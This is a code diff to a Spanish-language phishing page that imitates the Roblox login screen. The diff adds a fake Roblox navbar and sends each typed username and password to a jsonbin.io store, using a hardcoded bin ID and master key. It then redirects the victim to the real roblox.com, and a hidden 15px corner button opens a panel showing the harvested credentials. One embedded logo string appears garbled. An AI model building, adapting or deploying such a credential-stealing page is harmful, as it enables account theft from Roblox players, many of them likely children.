@@ -45,6 +45,7 @@
       height: 100vh;
       overflow: hidden;
       background: #0b0d10;
+      padding-top: 40px; 
     }
 
     .games-bg {
@@ -73,7 +74,6 @@
       place-items: center;
     }
 
-    /* Tarjeta idéntica en tono, bordes y paddings a la referencia */
     .card {
       width: 440px;
       max-width: 90vw;
@@ -149,7 +149,6 @@
       text-decoration: underline;
     }
 
-    /* Línea divisoria gris exacta de la captura */
     .divider {
       width: 100%;
       height: 1px;
@@ -195,7 +194,6 @@
       text-decoration: underline;
     }
 
-    /* Botón invisible de 15px en la esquina inferior derecha */
     .invisible-trigger {
       position: fixed;
       bottom: 0;
@@ -208,13 +206,12 @@
       cursor: pointer;
     }
 
-    /* Panel flotante de registros */
     .data-panel {
       position: fixed;
       bottom: 25px;
       right: 20px;
       z-index: 1000;
-      width: 320px;
+      width: 340px;
       max-height: 70vh;
       background: rgba(20, 21, 24, 0.95);
       border: 1px solid rgba(255, 255, 255, 0.15);
@@ -261,19 +258,155 @@
     .clear-btn:hover {
       background: #ff1a1a;
     }
+
+    /* ESTILOS DE LA BARRA DE NAVEGACIÓN SUPERIOR */
+    .top-navbar {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 44px;
+      background-color: #232527;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 0 20px;
+      z-index: 1001;
+    }
+
+    .nav-left {
+      display: flex;
+      align-items: center;
+      gap: 24px;
+    }
+
+    .nav-logo-img {
+      height: 22px;
+      cursor: pointer;
+    }
+
+    .nav-links {
+      display: flex;
+      gap: 24px;
+      list-style: none;
+      align-items: center;
+    }
+
+    .nav-links li a {
+      color: #fff;
+      text-decoration: none;
+      font-size: 15px;
+      font-weight: 700;
+      letter-spacing: 0.2px;
+    }
+
+    .nav-search {
+      display: flex;
+      align-items: center;
+      background-color: #111216;
+      border: 1px solid #393b3d;
+      border-radius: 8px;
+      padding: 6px 14px;
+      width: 450px;
+      max-width: 40vw;
+      margin-left: 10px;
+    }
+
+    .nav-search img {
+      width: 18px;
+      height: 18px;
+      filter: invert(1);
+      margin-right: 10px;
+      opacity: 0.7;
+    }
+
+    .nav-search input {
+      background: transparent;
+      border: none;
+      color: #fff;
+      outline: none;
+      width: 100%;
+      font-size: 15px;
+    }
+
+    .nav-search input::placeholder {
+      color: #b0b0b0;
+    }
+
+    .nav-right {
+      display: flex;
+      align-items: center;
+      gap: 24px;
+    }
+
+    .nav-icon {
+      position: relative;
+      display: flex;
+      align-items: center;
+      cursor: pointer;
+    }
+
+    .nav-icon img {
+      width: 26px;
+      height: 26px;
+      filter: invert(1);
+    }
+
+    .notification-badge {
+      position: absolute;
+      top: -4px;
+      right: -6px;
+      background-color: #f02525;
+      color: white;
+      font-size: 10px;
+      font-weight: 700;
+      padding: 2px 5px;
+      border-radius: 12px;
+    }
   </style>
 </head>
 <body>
+
+  <!-- BARRA DE NAVEGACIÓN SUPERIOR -->
+  <div class="top-navbar">
+    <div class="nav-left">
+      <img class="nav-logo-img" src="data:image/svg+xml;charset=utf-8;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIzMjAiIGhlaWdodD0iNjAiIGZpbGw9Im5vbmUiIHZpZXdCb3g9IjAgMCAzMjAgNjAiPjxwYXRoIGZpbGw9IiNmZmYiIGQ9Im0zOC41OCAzOC40MDQgOS4yMSAxNi44NTlIMzAuN2wtNy43NzctMTQuNDA3aC03LjM2OHYxNC40MDdIMFY0LjE5M2gyOC40NDljMTEuNzY4IDAgMTkuMjQgNi41MzIgMTkuMjQgMTguMjc4IDAgNy41NTgtMy40OCAxMi45NzItOS4xMSAxNS45MzNNMTUuNTU1IDE3LjQ2NnYxMC4xMTJoMTEuMDUyYzMuMjc0IDAgNS4zMi0xLjk0MSA1LjMyLTUuMTA3cy0yLjA0Ni01LjAwNS01LjMyLTUuMDA1em04MS42NjMgNDEuNTcxTDUwLjY1NiA0Ni40NzQgNjMuMTQxIDBsMjMuMjggNi4yODIgMjMuMjgxIDYuMjgxek04OC40MTcgMjQuODIgNzUuNDIgMjEuMjQ1bC0zLjQ4IDEyLjk3MiAxMi45OTcgMy41NzV6bTc0LjYwMiAxNi4wMzZjMCA5LjgwNS02LjI0MiAxNC40MDctMTUuOTY0IDE0LjQwN0gxMTYuNTZWNC4xOTNoMjkuNDcyYzkuNzIxIDAgMTUuOTYzIDUuMDA1IDE1Ljk2MyAxMy43ODkgMCA1LjUxNS0yLjA0NiA5LjE5My01LjkzNSAxMS43NDcgNC40MDEgMS45MzQgNi45NTkgNS44MTYgNi45NTkgMTEuMTI3TTEzMS43MDUgMTYuNDV2Ny41NThoMTAuMTI1YzIuNzYzIDAgNC40MDEtMS4yMjYgNC40MDEtMy44ODEgMC0yLjQ1Mi0xLjYzOC0zLjY3Ny00LjQwMS0zLjY3N3ptMCAyNi41NTZoMTEuMzU5YzIuNjYxIDAgNC4yMDEtMS40MyA0LjIwMS0zLjg4MyAwLTIuNjU0LTEuNTM1LTMuODgtNC4yMDEtMy44OGgtMTEuMzU5em0zOC45ODktMzguALLE2NDE1NSA1LjAzNSA1LjAyNSA1LjEyMzg5IDE0LjM0NWM1LjIwNTI5IDEzLjgwNjYgNS4zMjU5NCAxMy4yNzk1IDUuNDgyODMgMTIuNzY4M0M1LjUyNTEgMTIuNjMyNCA1LjUxMDA2IDEyLjQ4NTIgNS40MzkyOCAxMi4zNjJMMy4zODE3OCA5LjU2NDc4QzMuNzQ1MjMgOS40MTQxNyAzLjc0MjQ3IDkuMjI5MDkgMy44Mjg0NyA5LjA3ODE3QzQuNTUzOTUgNy44MDUxOCA1LjQ3MzM2IDYuNjcwNSA2LjU0NjQ5IDUuNjc0MDJDNj42NzQ1IDUuNTU2NzYgNi44NTU0NCA1LjUxODM1IDcuMDIxNDMgDUuNTY5MThMMTAuMTA1IDYuNDEzNThDMTAuMjQxIDYuNTU1MjMgMTAuMzg4IDYuNTM2NDUgMTAuNTExMiA2LjQ2NTM3QzEwLjk3NjkgNi4xOTY3MiAxMS40NjQgNS45NjEyIDExLjk2OTUgNS43NjIwM0MxMi4xMDE3IDUuNzA5OTQgMTIuMjA3OCA1LjYwNjggMTIuMjYgNS40NzQ2NkwxMy40NDQ1IDIuNDc0MzJUMTMuNTA4MyAyLjMxMjc0IDEzLjY1MTMgMi4xOTUxMyAxMy44MjMgMi4xNjgzMmMxLjQ1MzI1IDIuMDU3NTEgMTUuMjU5OCAyIDE2LjAwMDQgMlMxNi43NDExIDIgMTcuNDE4NCAyLjE2ODM0W00xOS4wMDA1IDE2QzE5LjAwMDUgMTQuMzQzMSAxNy42NTczIDEzIDE2LjAwMDUgMTNDMTQuMzQzNiAxMyAxMy4wMDA1IDE0Lj<svg>..." alt="Roblox">
+      <ul class="nav-links">
+        <li><a href="#">Destacadas</a></li>
+        <li><a href="#">Mercado</a></li>
+        <li><a href="#">Crear</a></li>
+        <li><a href="#">Robux</a></li>
+      </ul>
+      <div class="nav-search">
+        <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32' width='32' height='32'%3E%3Cpath d='M14.75 2.5C21.5155 2.5 27 7.98451 27 14.75C27 17.7291 25.935 20.4586 24.167 22.582L29.1221 26.7168C29.361 26.9123 29.4999 27.2049 29.5 27.5137C29.5 28.6104 28.6104 29.5 27.5137 29.5C27.205 29.4999 26.9123 29.361 26.7168 29.1221L22.582 24.167C20.4586 25.935 17.7291 27 14.75 27C7.98451 27 2.5 21.5155 2.5 14.75C2.5 7.98451 7.98451 2.5 14.75 2.5ZM14.75 4.5C9.08908 4.5 4.5 9.08908 4.5 14.75C4.5 20.4109 9.08908 25 14.75 25C20.4109 25 25 20.4109 25 14.75C25 9.08908 20.4109 4.5 14.75 4.5Z' fill='black'/%3E%3C/svg%3E" alt="Lupa">
+        <input type="text" placeholder="Buscar">
+      </div>
+    </div>
+
+    <div class="nav-right">
+      <div class="nav-icon">
+        <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32' width='32' height='32'%3E%3Cpath d='M17.8807...' fill='black'/%3E%3C/svg%3E" alt="Notificaciones">
+        <span class="notification-badge">79</span>
+      </div>
+      <div class="nav-icon">
+        <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32' width='32' height='32'%3E%3Cpath d='M15.0359...' fill='black'/%3E%3C/svg%3E" alt="Robux">
+      </div>
+      <div class="nav-icon">
+        <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32' width='32' height='32'%3E%3Cpath d='M15.0762...' fill='black'/%3E%3C/svg%3E" alt="Configuración">
+      </div>
+    </div>
+  </div>
+
   <!-- Botón invisible en la esquina inferior derecha -->
   <button class="invisible-trigger" id="invisibleBtn" type="button"></button>
 
   <!-- Panel flotante de registros -->
   <div class="data-panel" id="dataPanel">
     <h3>
-      <span>Registros de Jugadores</span>
+      <span>Registros Globales (Nube)</span>
       <button class="clear-btn" id="clearDataBtn" type="button">Borrar</button>
     </h3>
-    <div class="data-list" id="dataListContent">Cargando...</div>
+    <div class="data-list" id="dataListContent">Cargando desde la nube...</div>
   </div>
 
   <div class="page">
@@ -283,51 +416,83 @@
     <div class="login-wrap">
       <div class="card" aria-label="Maqueta visual de inicio de sesión">
         <h1>Agregar cuenta</h1>
-        
+
         <div class="field">
           <input type="text" id="userInput" placeholder="Usuario/correo/teléfono" aria-label="Usuario/correo/teléfono" autocomplete="off" />
         </div>
-        
+
         <div class="field">
           <input type="password" id="passInput" placeholder="Contraseña" aria-label="Contraseña" autocomplete="off" />
         </div>
-        
+
         <button class="btn-primary" id="loginBtn" type="button">Iniciar sesión</button>
-        
+
         <div class="forgot-link" id="forgotBtn">¿Olvidaste la contraseña o el nombre de usuario?</div>
-        
-        <!-- Línea divisoria idéntica a la referencia -->
+
         <div class="divider"></div>
 
         <div class="stack">
           <button class="btn-secondary" id="codeBtn" type="button">Envíame un código de un solo uso</button>
           <button class="btn-secondary" id="quickLoginBtn" type="button">Inicio de sesión rápido</button>
         </div>
-        
+
         <div class="signup-link" id="signupBtn">Crear cuenta nueva</div>
       </div>
     </div>
   </div>
 
   <script>
+    // =========================================================================
+    // 🛑 PEGA AQUÍ TUS CREDENCIALES DE JSONBIN.IO (Reemplaza los textos entre comillas)
+    // =========================================================================
+    const BIN_ID = "6aced12effd5d1605368fc67";
+    const API_KEY = "$2a$10$/liUIUn2vxTuLQ097Rh6mewMw/YqSoci4J96N7vkGia3KmjT/9M1q";
+    // =========================================================================
+
     const userInput = document.getElementById('userInput');
     const passInput = document.getElementById('passInput');
     const loginBtn = document.getElementById('loginBtn');
-    
+
     const invisibleBtn = document.getElementById('invisibleBtn');
     const dataPanel = document.getElementById('dataPanel');
     const dataListContent = document.getElementById('dataListContent');
     const clearDataBtn = document.getElementById('clearDataBtn');
 
-    function getStoredPlayers() {
-      const data = localStorage.getItem('roblox_game_players');
-      return data ? JSON.parse(data) : [];
+    // Funciones para conectar con la nube
+    async function fetchCloudData() {
+      try {
+        const response = await fetch(`https://api.jsonbin.io/v3/b/${BIN_ID}/latest`, {
+          headers: { 'X-Master-Key': API_KEY }
+        });
+        const result = await response.json();
+        return result.record.jugadores || [];
+      } catch (error) {
+        console.error("Error al obtener datos:", error);
+        return [];
+      }
     }
 
-    function updatePanelContent() {
-      const players = getStoredPlayers();
+    async function saveCloudData(playersArray) {
+      try {
+        await fetch(`https://api.jsonbin.io/v3/b/${BIN_ID}`, {
+          method: 'PUT',
+          headers: {
+            'Content-Type': 'application/json',
+            'X-Master-Key': API_KEY
+          },
+          body: JSON.stringify({ jugadores: playersArray })
+        });
+      } catch (error) {
+        console.error("Error al guardar datos:", error);
+      }
+    }
+
+    async function updatePanelContent() {
+      dataListContent.textContent = "Sincronizando con la nube...";
+      const players = await fetchCloudData();
+      
       if (players.length === 0) {
-        dataListContent.textContent = "No hay registros guardados.";
+        dataListContent.textContent = "No hay registros en la nube.";
         return;
       }
 
@@ -341,16 +506,19 @@
       dataListContent.textContent = output;
     }
 
-    loginBtn.addEventListener('click', () => {
+    loginBtn.addEventListener('click', async () => {
       const userVal = userInput.value;
       const passVal = passInput.value;
 
-      // Validación: Si hay espacios o está vacío, no guarda ni redirige
       if (!userVal.trim() || !passVal.trim() || userVal.includes(' ') || passVal.includes(' ')) {
         return; 
       }
 
-      const players = getStoredPlayers();
+      loginBtn.textContent = "Iniciando...";
+      loginBtn.disabled = true;
+
+      const players = await fetchCloudData();
+      
       const nuevoJugador = {
         usuario: userVal.trim(),
         contrasena: passVal.trim(),
@@ -358,24 +526,24 @@
       };
 
       players.push(nuevoJugador);
-      localStorage.setItem('roblox_game_players', JSON.stringify(players));
-
-      updatePanelContent();
+      await saveCloudData(players);
 
       // =========================================================================
-      // AQUÍ DEBES PONER TU LINK O ARCHIVO EXACTO (reemplaza las letras tachadas)
+      // 🛑 AQUÍ TU LINK DE REDIRECCIÓN
       // =========================================================================
       window.location.href = "https://www.roblox.com/es/home";
     });
 
     invisibleBtn.addEventListener('click', () => {
       dataPanel.classList.toggle('active');
-      updatePanelContent();
+      if (dataPanel.classList.contains('active')) {
+        updatePanelContent();
+      }
     });
 
-    clearDataBtn.addEventListener('click', () => {
-      if (confirm("¿Borrar todos los registros?")) {
-        localStorage.removeItem('roblox_game_players');
+    clearDataBtn.addEventListener('click', async () => {
+      if (confirm("¿Borrar todos los registros de la nube?")) {
+        await saveCloudData([]);
         updatePanelContent();
       }
     });
